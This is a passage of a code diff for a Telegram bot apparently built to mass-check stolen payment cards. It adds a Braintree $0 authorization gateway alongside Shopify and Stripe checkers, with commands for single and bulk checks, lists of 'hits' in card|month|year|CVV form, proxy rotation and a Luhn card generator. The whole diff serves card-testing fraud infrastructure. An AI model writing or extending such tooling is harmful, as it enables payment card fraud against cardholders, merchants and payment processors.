+            bot.edit_message_text(final_text, chat_id=chat_id, message_id=msg_id,
+                                parse_mode='Markdown', reply_markup=result_keyboard)
+        except:
+            pass
+    
+    t = threading.Thread(target=run_b3_mass, args=(message.chat.id, progress_msg.message_id))
+    t.daemon = True
+    t.start()
+
+# ============================================
+# BRAINTREE AUTH HITS & CLEAR COMMANDS
+# ============================================
+
+@bot.message_handler(commands=['b3hits'])
+def b3_hits_command(message):
+    hits = get_b3_hits()
+    if not hits:
+        bot.reply_to(message, "❌ No Braintree Auth hits yet")
+        return
+    response = f"💳 *{BOT_NAME} ─ BRAINTREE AUTH $0 HITS ({len(hits)})*\n{LINE_DASH}\n\n"
+    for i, hit in enumerate(hits[-20:], 1):
+        cc = hit.get('cc', '?')
+        month = hit.get('month', '?')
+        year = hit.get('year', '?')
+        cvv = hit.get('cvv', '?')
+        cat = hit.get('category', '?')
+        icon, _, dot = get_status_emoji(cat)
+        response += f"  {dot} `{cc}|{month}|{year}|{cvv}`\n"
+        response += f"     └─ {icon} {cat}\n"
+    response += f"\n{LINE_THIN}\n📊 Total hits: *{len(hits)}*"
+    safe_send_message(message.chat.id, response, parse_mode='Markdown')
+
+@bot.message_handler(commands=['clearb3'])
+def clear_b3_command(message):
+    count = len(get_all_b3_cards())
+    clear_b3_cards()
+    response = f"""🗑️ *{BOT_NAME} ─ BRAINTREE AUTH CARDS DELETED*
+{LINE_THIN}
+💳 *Cards deleted:* {count}
+📊 *Remaining:* 0
+
+💡 Send a new `.txt` file and select Braintree Auth to load more cards"""
     safe_send_message(message.chat.id, response, parse_mode='Markdown')
 
 # ============================================
@@ -3489,8 +4263,8 @@ def clear_shopify_command(message):
 
 @bot.message_handler(commands=['stop'])
 def stop_mass_check(message):
-    global mass_check_running, stripe_mass_running, sc_mass_running, stop_mass_flag
-    if mass_check_running or stripe_mass_running or sc_mass_running:
+    global mass_check_running, stripe_mass_running, sc_mass_running, b3_mass_running, stop_mass_flag
+    if mass_check_running or stripe_mass_running or sc_mass_running or b3_mass_running:
         stop_mass_flag = True
         bot.reply_to(message, f"🛑 *Stopping mass check...*\n{LINE_THIN}\nPlease wait while workers finish...", parse_mode='Markdown')
         try:
@@ -3505,11 +4279,12 @@ Please wait while workers finish...""",
         except:
             pass
         def force_reset():
-            global mass_check_running, stripe_mass_running, sc_mass_running, stop_mass_flag
+            global mass_check_running, stripe_mass_running, sc_mass_running, b3_mass_running, stop_mass_flag
             time.sleep(15)
             mass_check_running = False
             stripe_mass_running = False
             sc_mass_running = False
+            b3_mass_running = False
             stop_mass_flag = False
         t = threading.Thread(target=force_reset, daemon=True)
         t.start()
@@ -3523,9 +4298,11 @@ def show_stats(message):
     cards = get_all_cards()
     stripe_cards = get_all_stripe_cards()
     sc_cards = get_all_sc_cards()
+    b3_cards = get_all_b3_cards()
     hits = get_hits()
     stripe_hits = get_stripe_hits()
     sc_hits_data = get_sc_hits()
+    b3_hits_data = get_b3_hits()
     permanent = sqlite_backup.get_permanent_sites()
     
     stats_text = f"""📊 *{BOT_NAME} {BOT_VERSION}*
@@ -3545,6 +4322,10 @@ def show_stats(message):
 💳 *━━ STRIPE CHARGE ━━*
    ├ 💳 Queued: *{len(sc_cards)}*
    └ 🏆 Hits: *{len(sc_hits_data)}*
+
+🔐 *━━ BRAINTREE AUTH ━━*
+   ├ 💳 Queued: *{len(b3_cards)}*
+   └ 🏆 Hits: *{len(b3_hits_data)}*
 
 ⚙️ *━━ SYSTEM ━━*
    ├ 📡 Proxies: *{len(proxies)}*
@@ -3808,7 +4589,7 @@ def mode_command(message):
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callback(call):
-    global current_max_workers, mass_check_running, stripe_mass_running, sc_mass_running, stop_mass_flag, current_mode, PARALLEL_WORKERS, last_dead_proxies, mass_paused
+    global current_max_workers, mass_check_running, stripe_mass_running, sc_mass_running, b3_mass_running, stop_mass_flag, current_mode, PARALLEL_WORKERS, last_dead_proxies, mass_paused
     
     if call.data == "check":
         bot.answer_callback_query(call.id)
@@ -3837,6 +4618,18 @@ def handle_callback(call):
     elif call.data == "sc_hits":
         bot.answer_callback_query(call.id)
         sc_hits_command(call.message)
+    
+    elif call.data == "b3_check":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "🔐 /b3 cc|mm|yy|cvv")
+    
+    elif call.data == "b3_mass":
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "/mb3")
+    
+    elif call.data == "b3_hits":
+        bot.answer_callback_query(call.id)
+        b3_hits_command(call.message)
     
     elif call.data == "stats":
         bot.answer_callback_query(call.id)
@@ -3925,10 +4718,12 @@ def handle_callback(call):
     elif call.data == "clear_menu":
         shopify_count = len(get_all_cards())
         stripe_count = len(get_all_stripe_cards())
+        b3_count = len(get_all_b3_cards())
         markup = InlineKeyboardMarkup(row_width=1)
         markup.add(
             InlineKeyboardButton(f"🛒 Delete Shopify Cards ({shopify_count})", callback_data="confirm_clear_shopify"),
             InlineKeyboardButton(f"🔓 Delete Stripe Auth Cards ({stripe_count})", callback_data="confirm_clear_stripe"),
+            InlineKeyboardButton(f"🔐 Delete Braintree Auth Cards ({b3_count})", callback_data="confirm_clear_b3"),
             InlineKeyboardButton("↩️ Cancel", callback_data="cancel_clear")
         )
         try:
@@ -3937,6 +4732,7 @@ def handle_callback(call):
 
 🛒 Shopify: *{shopify_count}* cards
 🔓 Stripe Auth: *{stripe_count}* cards
+🔐 Braintree Auth: *{b3_count}* cards
 
 🔽 *Select which cards to delete:*""", 
                                 chat_id=call.message.chat.id, message_id=call.message.message_id,
@@ -3967,6 +4763,17 @@ def handle_callback(call):
         except:
             pass
     
+    elif call.data == "confirm_clear_b3":
+        count = len(get_all_b3_cards())
+        clear_b3_cards()
+        bot.answer_callback_query(call.id, f"✅ {count} Braintree Auth cards deleted")
+        try:
+            bot.edit_message_text(f"🗑️ *{count} Braintree Auth cards deleted*\n{LINE_THIN}\n🔐 Braintree Auth queue is now empty", 
+                                chat_id=call.message.chat.id, message_id=call.message.message_id,
+                                parse_mode='Markdown')
+        except:
+            pass
+    
     elif call.data == "cancel_clear":
         bot.answer_callback_query(call.id, "Cancelled")
         try:
@@ -3977,7 +4784,7 @@ def handle_callback(call):
             pass
     
     elif call.data == "stop_mass":
-        if mass_check_running or stripe_mass_running or sc_mass_running:
+        if mass_check_running or stripe_mass_running or sc_mass_running or b3_mass_running:
             stop_mass_flag = True
             bot.answer_callback_query(call.id, "🛑 Stopping mass check...")
             try:
@@ -4127,8 +4934,8 @@ Please wait while workers finish...""",
             gw_choice = call.data.replace("file_gw_", "")
             
             if gw_choice == "all":
-                gateways = ["shopify", "stripe_auth", "stripe_charge"]
-                gw_names = ["🛒 Shopify", "🔓 Stripe Auth", "💳 Stripe Charge $10"]
+                gateways = ["shopify", "stripe_auth", "stripe_charge", "braintree_auth"]
+                gw_names = ["🛒 Shopify", "🔓 Stripe Auth", "💳 Stripe Charge $10", "🔐 Braintree Auth $0"]
             elif gw_choice == "shopify":
                 gateways = ["shopify"]
                 gw_names = ["🛒 Shopify"]
@@ -4138,6 +4945,9 @@ Please wait while workers finish...""",
             elif gw_choice == "stripe_charge":
                 gateways = ["stripe_charge"]
                 gw_names = ["💳 Stripe Charge $10"]
+            elif gw_choice == "braintree_auth":
+                gateways = ["braintree_auth"]
+                gw_names = ["🔐 Braintree Auth $0"]
             else:
                 gateways = []
                 gw_names = []
@@ -4159,7 +4969,8 @@ Please wait while workers finish...""",
             response += f"\n{LINE_THIN}\n📊 *Queues:*\n"
             response += f"   🛒 Shopify: *{len(get_all_cards())}*\n"
             response += f"   🔓 Stripe Auth: *{len(get_all_stripe_cards())}*\n"
-            response += f"   💳 Stripe Charge $10: *{len(get_all_sc_cards())}*"
+            response += f"   💳 Stripe Charge $10: *{len(get_all_sc_cards())}*\n"
+            response += f"   🔐 Braintree Auth $0: *{len(get_all_b3_cards())}*"
             
             markup = InlineKeyboardMarkup(row_width=1)
             if gw_choice == "shopify" or gw_choice == "all":
@@ -4171,6 +4982,9 @@ Please wait while workers finish...""",
             if gw_choice == "stripe_charge" or gw_choice == "all":
                 if len(get_all_sc_cards()) > 0:
                     markup.add(InlineKeyboardButton("💳 START SC MASS ▶️", callback_data="sc_mass"))
+            if gw_choice == "braintree_auth" or gw_choice == "all":
+                if len(get_all_b3_cards()) > 0:
+                    markup.add(InlineKeyboardButton("🔐 START B3 MASS ▶️", callback_data="b3_mass"))
             
             try:
                 bot.edit_message_text(response, chat_id=call.message.chat.id, message_id=call.message.message_id,
@@ -4205,6 +5019,12 @@ Please wait while workers finish...""",
   /clearsc ─ Delete cards
   /schits ─ View hits
 
+🔐 *━━ BRAINTREE AUTH $0 ━━*
+  /b3 `cc|mm|yy|cvv` ─ Single check
+  /mb3 ─ Mass check (pipeline)
+  /clearb3 ─ Delete cards
+  /b3hits ─ View hits
+
 🏦 *━━ UTILITIES ━━*
   /bin `424242` ─ BIN lookup
   /gen `424242` `10` ─ Generate cards (Luhn)
@@ -4218,7 +5038,7 @@ Please wait while workers finish...""",
 
 📂 *━━ FILE UPLOAD ━━*
   Send `.txt` file → select gateway
-  Choose: Shopify, Stripe Auth, Stripe Charge $10, or ALL
+  Choose: Shopify, Stripe Auth, Stripe Charge $10, Braintree Auth $0, or ALL
 
 🧹 *━━ AUTO-MAINTENANCE ━━*
   Dead sites auto-cleaned every 50 checks
@@ -4261,7 +5081,7 @@ def start_health_server():
 # ============================================
 if __name__ == "__main__":
     print("\n" + "═" * 60)
-    print(f"  🤖 {BOT_NAME} {BOT_VERSION} + STRIPE AUTH + STRIPE CHARGE $10")
+    print(f"  🤖 {BOT_NAME} {BOT_VERSION} + STRIPE AUTH + STRIPE CHARGE $10 + BRAINTREE AUTH")
     print(f"  🚀 PARALLEL PIPELINE MODE")
     print("═" * 60)
     print(f"  🌐 Public mode: ALL USERS")
@@ -4269,6 +5089,7 @@ if __name__ == "__main__":
     print(f"  🛒 Shopify cards: {len(get_all_cards())}")
     print(f"  🔓 Stripe Auth cards: {len(get_all_stripe_cards())}")
     print(f"  💳 Stripe Charge $10 cards: {len(get_all_sc_cards())}")
+    print(f"  🔐 Braintree Auth $0 cards: {len(get_all_b3_cards())}")
     print(f"  🌐 Sites: {len(load_sites())}")
     print(f"  📡 Proxies: {len(load_proxies())}")
     print(f"  🎮 Mode: {current_mode} ({PARALLEL_WORKERS}x)")
@@ -4277,6 +5098,7 @@ if __name__ == "__main__":
     print("    /mass  ─ Shopify mass check")
     print("    /mau   ─ Stripe Auth mass check (FREE)")
     print("    /msc   ─ Stripe Charge $10 mass check")
+    print("    /mb3   ─ Braintree Auth $0 mass check")
     print("    /px    ─ Check proxies")
     print("    /stats ─ Statistics")
     print("─" * 60)
